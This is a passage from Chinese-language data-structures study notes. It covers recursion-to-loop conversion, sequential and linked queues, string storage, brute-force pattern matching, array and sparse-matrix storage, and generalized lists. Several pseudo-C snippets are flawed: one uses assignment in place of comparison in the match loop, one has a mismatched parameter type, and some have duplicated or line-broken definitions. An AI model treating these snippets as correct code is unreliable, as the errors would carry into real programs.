系统完成:</p><p>(1) 保存被调用函数的计算结果</p><p>(2) 释放被调用函数的数据区</p><p>(3) 依照被调用函数保存的返回地址将控制转移到调用函数</p><blockquote><p>尾递归 循环结构</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">Fact</span> <span class="params">( <span class="type">long</span> n )</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( n == <span class="number">0</span>) </span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="keyword">return</span> n * Fact (n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="title function_">Fact</span> <span class="params">( <span class="type">long</span> n )</span> &#123;</span><br><span class="line">t=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">t=t*i;</span><br><span class="line"><span class="keyword">return</span> t; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>单向递归 循环结构</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">虽然有一处以上的递归调用语句，但各次递归调用语句的</span><br><span class="line">参数只和主调函数有关，相互之间参数无关，并且这些递</span><br><span class="line">归调用语句处于算法的最后。</span><br><span class="line"><span class="type">long</span> <span class="title function_">Fib</span> <span class="params">( <span class="type">long</span> n )</span> &#123;<span class="comment">// Fibonacci数列</span></span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span> || n==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> Fib (n<span class="number">-1</span>)+ Fib (n<span class="number">-2</span>);&#125;</span><br></pre></td></tr></table></figure><blockquote><p>尾递归、单向递归-&gt;循环结构</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">Fib</span> <span class="params">( <span class="type">long</span> n )</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span> || n==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">t1=<span class="number">1</span>; t2=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">3</span>; i&lt;=n; i++)</span><br><span class="line">&#123;</span><br><span class="line">t3=t1+t2; </span><br><span class="line">t1=t2; </span><br><span class="line">t2=t3;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> t3; &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="5-队列的的表示和操作的实现"><a href="#5-队列的的表示和操作的实现" class="headerlink" title="5 队列的的表示和操作的实现"></a>5 队列的的表示和操作的实现</h2><h3 id="5-1队列的抽象数据类型"><a href="#5-1队列的抽象数据类型" class="headerlink" title="5.1队列的抽象数据类型"></a>5.1队列的抽象数据类型</h3><pre><code>ADT Queue&#123;    数据对象:...    数据关系:...    基本操作：    (1) InitQueue (&amp;Q) //构造空队列    (2) DestroyQueue (&amp;Q) //销毁队列    (3) ClearQueue (&amp;S) //清空队列    (4) QueueEmpty(S) //判空. --TRUE,    (5) QueueLength(Q) //取队列长度    (6) GetHead (Q,&amp;e) //取队头元素    (7) EnQueue (&amp;Q,e) //入队列    (8) DeQueue (&amp;Q,&amp;e) //出队列    (9) QueueTraverse(Q,visit()) //遍历&#125;ADT Queue</code></pre><h3 id="5-2队列的抽象数据类型队列的顺序表示－－用一维数组base-M"><a href="#5-2队列的抽象数据类型队列的顺序表示－－用一维数组base-M" class="headerlink" title="5.2队列的抽象数据类型队列的顺序表示－－用一维数组base[M]"></a>5.2队列的抽象数据类型队列的顺序表示－－用一维数组base[M]</h3><blockquote><p>初始化定义</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> M 100 <span class="comment">//最大队列长度</span></span></span><br><span class="line">Typedef <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">QElemType *base; <span class="comment">//初始化的动态分配存储空间（表示</span></span><br><span class="line">存储空间的基地址：对比顺序栈，队列的两个指针均</span><br><span class="line">需要移动，栈的base指针不需要移动）</span><br><span class="line"><span class="type">int</span> front; <span class="comment">//头指针</span></span><br><span class="line"><span class="type">int</span> rear; <span class="comment">//尾指针</span></span><br><span class="line">&#125;SqQueue;</span><br></pre></td></tr></table></figure><p><img src="/img/%E5%BE%AA%E7%8E%AF%E9%98%9F%E5%88%97.jpg" alt="循环队列"></p><h3 id="5-3循环队列"><a href="#5-3循环队列" class="headerlink" title="5.3循环队列"></a>5.3循环队列</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 100 <span class="comment">//最大队列长度</span></span></span><br><span class="line">Typedef <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">#<span class="title">define</span> <span class="title">MAXQSIZE</span> 100 //最大长度</span></span><br><span class="line"><span class="class"><span class="title">Typedef</span> <span class="keyword">struct</span> &#123;</span></span><br><span class="line">QElemType *base; <span class="comment">//初始化的动态分配存储空间</span></span><br><span class="line"><span class="type">int</span> front; <span class="comment">//头指针</span></span><br><span class="line"><span class="type">int</span> rear; <span class="comment">//尾指针</span></span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造一个空的队列</span></span><br><span class="line">Status <span class="title function_">InitQueue</span> <span class="params">(SqQueue &amp;Q)</span></span><br><span class="line">&#123;</span><br><span class="line">Q.base =new QElemType[MAXQSIZE] <span class="comment">//为队列分配</span></span><br><span class="line">一个数组空间</span><br><span class="line"><span class="keyword">if</span>(!Q.base) <span class="built_in">exit</span>(OVERFLOW); <span class="comment">//存储分配失败</span></span><br><span class="line">Q.front=Q.rear=<span class="number">0</span>; <span class="comment">//头指针和尾指针置为0，队列为空</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>求循环队列的长度</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回Q的元素个数，即队列的长度</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">QueueLength</span> <span class="params">(SqQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (Q.rear-Q.front+MAXQSIZE)%MAXQSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：非循环队列尾和头指针的差值就是队列长度，循环队列差值可能为负，故加上MAXQSIZE再与MAXQSIZE求余</p><blockquote><p>循环队列入队</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(SqQueue &amp;Q,QElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果队满，返回错误</span></span><br><span class="line"><span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MAXQSIZE==Q.front) <span class="keyword">return</span> ERROR;</span><br><span class="line">Q.base[Q.rear]=e; <span class="comment">//新元素插入队尾</span></span><br><span class="line">Q.rear=(Q.rear+<span class="number">1</span>)%MAXQSIZE; <span class="comment">//队尾指针加1</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>循环队列出队</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DeQueue</span> <span class="params">(LinkQueue &amp;Q,QElemType &amp;e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果队列为空，返回错误</span></span><br><span class="line"><span class="keyword">if</span>(Q.front==Q.rear) <span class="keyword">return</span> ERROR;</span><br><span class="line">e=Q.base[Q.front]; <span class="comment">//保存队头元素</span></span><br><span class="line">Q.front=(Q.front+<span class="number">1</span>)%MAXQSIZE; <span class="comment">//队头指针加1</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取循环队列的队头元素</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回队头元素，不修改队头指针</span></span><br><span class="line">SElemType <span class="title function_">GetHead</span> <span class="params">(SqQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Q.front != Q.rear) <span class="comment">//队列非空</span></span><br><span class="line"><span class="keyword">return</span> Q.base[Q.front]; <span class="comment">//返回队头元素的值，队头</span></span><br><span class="line">指针不变</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-链队列"><a href="#6-链队列" class="headerlink" title="6 链队列"></a>6 链队列</h2><p>链队，链式存储结构实现的队列，通常用单链表表示。为便于操作，链队包含头结点，队头指针指向头结点。</p><p><img src="/img/%E9%93%BE%E9%98%9F%E5%88%97.png" alt="链队列"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span>&#123;</span></span><br><span class="line">QElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Qnode</span> *<span class="title">next</span>;</span> &#125;Qnode, *QueuePtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">QueuePtr front; <span class="comment">//队头指针</span></span><br><span class="line">QueuePtr rear; <span class="comment">//队尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line">Status <span class="title function_">InitQueue</span> <span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">Q.front=Q.rear=new Qnode; <span class="comment">//生成一个新节点作为头结</span></span><br><span class="line">点，队头和队尾指针指向此节点</span><br><span class="line"><span class="keyword">if</span> (!Q.front) <span class="built_in">exit</span>(OVERFLOW); <span class="comment">//失败</span></span><br><span class="line">Q.front-&gt;next=<span class="literal">NULL</span>; <span class="comment">//头结点的指针域置空</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>销毁链队列</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DestroyQueue</span> <span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line"><span class="comment">//从头节点开始，依次释放第1个元素（销毁操作开始前的队头节点）</span></span><br><span class="line">，第<span class="number">2</span>个元素，直到最后一个元素（销毁操作开始前的队尾节点）</span><br><span class="line"><span class="keyword">while</span>(Q.front)&#123; <span class="comment">//队头指针不为空</span></span><br><span class="line">Q.rear=Q.front-&gt;next; <span class="comment">//队尾指针指向对头指针指向的下 一个</span></span><br><span class="line">节点</span><br><span class="line"><span class="built_in">free</span> (Q.front); <span class="comment">//释放当前节点(第一次是头结点)</span></span><br><span class="line">Q.front=Q.rear; <span class="comment">//队头指针指向下一个节点（与队尾指针 指向同</span></span><br><span class="line">一个节点） ，只要有节点未销毁，指针将不为空</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>判断链队列是否为空</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">QueueEmpty</span> <span class="params">(LinkQueue Q)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (Q.front==Q.rear); <span class="comment">//链头是否等于链尾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>取链队列的队头元素</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">GetHead</span> <span class="params">(LinkQueue Q, QElemType &amp;e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Q.front==Q.rear) <span class="keyword">return</span> ERROR; <span class="comment">//空队列返回错误</span></span><br><span class="line">e=Q.front-&gt;next-&gt;data; <span class="comment">//返回队头元素的值，指针不变</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/%E9%93%BE%E9%98%9F%E5%88%97%E7%9A%84%E5%AD%98%E5%82%A8.png" alt="链队列的存储"></p><blockquote><p>链队列入队</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,QElemType e)</span>&#123;</span><br><span class="line">p=new QNode; <span class="comment">//为入队元素分配节点空间，用指针p指向</span></span><br><span class="line"><span class="keyword">if</span>(!p) <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">p-&gt;data=e; <span class="comment">//将新节点数据域置为e p-&gt;next=NULL; //将新节点指针域置为空（队尾）</span></span><br><span class="line">Q.rear-&gt;next=p; <span class="comment">//将队尾节点的指针域指向新节点</span></span><br><span class="line">Q.rear=p; <span class="comment">//移动队尾指针，指向新节点</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/%E9%93%BE%E9%98%9F%E5%88%97%E5%87%BA%E9%98%9F.png" alt="链队列出队"></p><blockquote><p>链队列入队</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DeQueue</span> <span class="params">(LinkQueue &amp;Q,QElemType &amp;e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(Q.front==Q.rear) <span class="keyword">return</span> ERROR; <span class="comment">//队列为空返回错误</span></span><br><span class="line">p=Q.front-&gt;next; <span class="comment">//p指向队头元素节点</span></span><br><span class="line">e=p-&gt;data; <span class="comment">//保存队头元素节点值</span></span><br><span class="line">Q.front-&gt;next=p-&gt;next; <span class="comment">//修改队头指针指向出队节点的下一个</span></span><br><span class="line"><span class="keyword">if</span>(Q.rear==p) Q.rear=Q.front; <span class="comment">//若队尾节点出队，队尾指针指</span></span><br><span class="line">向头节点</span><br><span class="line">delete p; <span class="comment">//释放原队头节点空间</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h1><blockquote><p>补充：C语言中常用的串运算</p></blockquote><pre><code>调用标准库函数 #include&lt;string.h&gt;串比较，strcmp(char s1,char s2) 串复制，strcpy(char to,char from)串连接，strcat(char to,char from) 求串长，strlen(char s)</code></pre><h2 id="4-1串"><a href="#4-1串" class="headerlink" title="4.1串"></a>4.1串</h2><p><img src="/img/%E4%B8%B2%E7%9A%84%E5%AE%9A%E4%B9%89.png" alt="串的定义"></p><ul><li>串(String)：零个或多个字符组成的有限序列</li><li>子串：串中任意个连续的字符组成的子序列称为该串的子串；</li><li>位置：字符在序列中的序号；</li><li>子串位置：子串的第一个字符在主串中的位置；</li><li>串相等：两个串的长度相等，且各个对应位置的字符都相等；</li><li>空格串：一个或多个空格组成的串</li><li>空串：零个字符的串，长度为零</li></ul><h2 id="4-2案例引入"><a href="#4-2案例引入" class="headerlink" title="4.2案例引入"></a>4.2案例引入</h2><p>  研究者将人的DNA和病毒DNA均表示成由一些字母组成的字符串序列。</p><p>  然后检测某种病毒DNA序列是否在患者的DNA序列中出现过，如果出现过，则此人感染了该病毒，否则没有感染。</p><p>  例如，假设病毒的DNA序列为baa，患者1的DNA序列为aaabbba，则感染，患者2的DNA序列为babbba，则未感染。</p><p>（注意，人的DNA序列是线性的，而病毒的DNA序列是环状的）</p><h2 id="4-3串的类型定义、存储结构及运算"><a href="#4-3串的类型定义、存储结构及运算" class="headerlink" title="4.3串的类型定义、存储结构及运算"></a>4.3串的类型定义、存储结构及运算</h2><h3 id="4-3-1类型定义"><a href="#4-3-1类型定义" class="headerlink" title="4.3.1类型定义"></a>4.3.1类型定义</h3><p>ADT String {<br>    数据对象:…<br>    数据关系:…<br>    基本操作:<br>    (1) StrAssign (&amp;T,chars) &#x2F;&#x2F;串赋值<br>    (2) StrCompare (S,T) &#x2F;&#x2F;串比较<br>    (3) StrLength (S) &#x2F;&#x2F;求串长<br>    (4) Concat(&amp;T,S1,S2) &#x2F;&#x2F;串联<br>    (5) SubString(&amp;Sub,S,pos,len) &#x2F;&#x2F;求子串<br>    (6) StrCopy(&amp;T,S) &#x2F;&#x2F;串拷贝<br>    (7) StrEmpty(S) &#x2F;&#x2F;串判空<br>    (8) ClearString (&amp;S) &#x2F;&#x2F;清空串<br>    (9) Index(S,T,pos) &#x2F;&#x2F;子串的位置<br>    (11) Replace(&amp;S,T,V) &#x2F;&#x2F;串替换<br>    (12) StrInsert(&amp;S,pos,T) &#x2F;&#x2F;子串插入<br>    (12) StrDelete(&amp;S,pos,len) &#x2F;&#x2F;子串删除<br>    (13) DestroyString(&amp;S) &#x2F;&#x2F;串销毁<br>}ADT String</p><h3 id="4-3-2串的存储结构"><a href="#4-3-2串的存储结构" class="headerlink" title="4.3.2串的存储结构"></a>4.3.2串的存储结构</h3><p>顺序存储,链式存储</p><blockquote><p>串的定长顺序存储结构</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">char</span> ch[MAXLEN+<span class="number">1</span>]; <span class="comment">//存储串的一维数组</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//串的当前长度</span></span><br><span class="line">&#125;SString;</span><br></pre></td></tr></table></figure><blockquote><p>串的堆式顺序存储结构</p></blockquote><p>设定固定串空间不尽合理，无法根据需要动态分配和释放字符数组空间，C语言中存在称为“堆”的自由存储区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">char</span> *ch; <span class="comment">//若串非空,则按串长分配存储区,</span></span><br><span class="line"><span class="comment">//否则ch为NULL</span></span><br><span class="line"><span class="type">int</span> length; <span class="comment">//串长度</span></span><br><span class="line">&#125;HString;</span><br></pre></td></tr></table></figure><blockquote><p>串的链式存储结构</p></blockquote><p>链表存储串值时可能存在：每个节点存放一个字符或多个字<br>符的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE 80 <span class="comment">//可由用户定义的块大小</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span>&#123;</span></span><br><span class="line"><span class="type">char</span> ch[CHUNKSIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Chunk;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">Chunk *head,*tail; <span class="comment">//串的头指针和尾指针</span></span><br><span class="line"><span class="type">int</span> curlen; <span class="comment">//串的当前长度</span></span><br><span class="line">&#125;LString;</span><br></pre></td></tr></table></figure><h3 id="4-3-3-串的模式匹配算法"><a href="#4-3-3-串的模式匹配算法" class="headerlink" title="4.3.3 串的模式匹配算法"></a>4.3.3 串的模式匹配算法</h3><blockquote><p>BF算法(重点)</p></blockquote><p><img src="/img/BF%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3.png" alt="BF算法设计思想"></p><p><em><strong>Index(S, T, pos)</strong></em></p><p>将主串S的第pos个字符和模式T的第1字符（j&#x3D;1）比较，若相等，继续逐个比较后续字符；若出现某个字符等，从主串的下一字符（i&#x3D;i-j+2）起，重新与模式的第一个字符（j&#x3D;1）比较。</p><p>直到主串的一个连续子串字符序列与模式相等 。<br>返回值为S中与T匹配的子序列第一个字符的序号， 即匹配成功。</p><p>否则，匹配失败，返回值 0</p><figure class="highlight c"><figcaption><span>BF算法描述</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(Sstring S, Sstring T, <span class="type">int</span> pos)</span>&#123;</span><br><span class="line">i=pos; j=<span class="number">1</span>; <span class="comment">//初始化</span></span><br><span class="line"><span class="keyword">while</span> (i&lt;=S.length &amp;&amp; j &lt;=T.length) <span class="comment">//两个串均未比较到串尾</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( S[ i ]=T[ j ]) &#123;++i; ++j; &#125; <span class="comment">//继续比较后续字符</span></span><br><span class="line"><span class="keyword">else</span>&#123; i=i-j+<span class="number">2</span>; j=<span class="number">1</span>; &#125; <span class="comment">//指针后退重新开始匹配</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( j&gt;T.length) <span class="keyword">return</span> i－T.length; <span class="comment">//匹配成功，返回位置</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//匹配失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心：理解匹配失败后主串下一个位置</p><p>最好情况: 算法复杂度O(n+m)</p><p>最坏情况:总次数为：(n-m)*m+m＝(n-m+1)<em>m; 若m&lt;&lt;n，则算法复杂度O(n</em>m)</p><blockquote><p>KMP算法</p></blockquote><p><img src="/img/KMP%E7%AE%97%E6%B3%95.jpg" alt="KMP算法"></p><h2 id="4-4数组"><a href="#4-4数组" class="headerlink" title="4.4数组"></a>4.4数组</h2><h3 id="4-4-1类型定义"><a href="#4-4-1类型定义" class="headerlink" title="4.4.1类型定义"></a>4.4.1类型定义</h3><p>ADT  Array {<br>    数据对象:…<br>    数据关系:…<br>    基本操作:<br>    (1) InitArray (&amp;A,n,bound1, boundn) &#x2F;&#x2F;构造数组A<br>    (2) DestroyArray (&amp;A) &#x2F;&#x2F; 销毁数组A<br>    (3) Value(A,&amp;e,index1,…,indexn) &#x2F;&#x2F;取数组元素值<br>    (4) Assign (A,&amp;e,index1,…,indexn) &#x2F;&#x2F;给数组元素赋值<br>}ADT  Array</p><p><img src="/img/%E6%95%B0%E7%BB%84.jpg" alt="数组"></p><p>二维数组常用：<br><em>LOC ( i, j ) &#x3D; a + (i * n + j)<em>L</em></em></p><h3 id="4-4-2特殊矩阵的压缩存储"><a href="#4-4-2特殊矩阵的压缩存储" class="headerlink" title="4.4.2特殊矩阵的压缩存储"></a>4.4.2特殊矩阵的压缩存储</h3><p>什么是压缩存储？</p><p>若多个数据元素的值都相同，则只分配一个元素值的存储空间，且零元素不占存储空间。</p><p>什么样的矩阵能够压缩？</p><p>一些特殊矩阵，如：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵等。</p><p>什么叫稀疏矩阵？</p><p>矩阵中非零元素的个数较少（一般小于5%）</p><ol><li><p>对称矩阵<br>[特点]:在n×n的矩阵A中，满足如下性质：aij&#x3D;aji (1 ≤ i, j ≤ n)<br><br><br>[存储方法]: 只存储下(或者上)三角(包括主对角线)的数据元素。共占用n(n+1)&#x2F;2个元素空间。<br><br><img src="https://www.helloimg.com/images/2022/10/30/ZVg8xm.md.png" alt="对称矩阵"></p></li><li><p>三角矩阵<br>[特点]:对角线以下(或者以上)的数据元素(不包括对角线)全部为常数c。<br><br><br><a href="%E4%BB%A5%E5%AF%B9%E8%A7%92%E7%BA%BF%E7%9A%84%E9%A1%BA%E5%BA%8F%E5%AD%98%E5%82%A8%E5%88%B0%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%8A"> 存储方法</a>: 重复元素c共享一个元素存储空间，共占用n(n+1)&#x2F;2+1个元素空间: sa[0.. n(n+1)&#x2F;2]<br><img src="https://www.helloimg.com/images/2022/10/30/ZVgKWh.md.png" alt="三角矩阵"></p></li><li><p>对角矩阵（带状矩阵）<br>   [ 特点]:在n×n的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内 — L对角矩阵。</p></li></ol><p>   <img src="https://www.helloimg.com/images/2022/10/30/ZVgUgc.md.png" alt="对角矩阵（带状矩阵）"></p><ol start="4"><li>稀疏矩阵<br>   [ 特点]:大多数元素为零。</li></ol><p>   <a href="%E4%BB%A5%E5%AF%B9%E8%A7%92%E7%BA%BF%E7%9A%84%E9%A1%BA%E5%BA%8F%E5%AD%98%E5%82%A8%E5%88%B0%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%8A"> 存储方法</a>: 只记录每一非零元素(i, j, aij ) 节省空间，但丧失随机存取功能</p><p>   <img src="https://www.helloimg.com/images/2022/10/30/ZVgkaq.md.png" alt="稀疏矩阵"></p><h2 id="4-5广义表"><a href="#4-5广义表" class="headerlink" title="4.5广义表"></a>4.5广义表</h2><p>广义表（线性表的推广，也称为列表）： n ( 0 )个表元素组成的有限序列，记作LS &#x3D; (a0, a1, a2, …, an-1)</p><p>LS是表名。<br>ai是表元素，它可以是表 (称为子表)，可以是数据元素(称为原子)。<br>n为表的长度。n &#x3D; 0 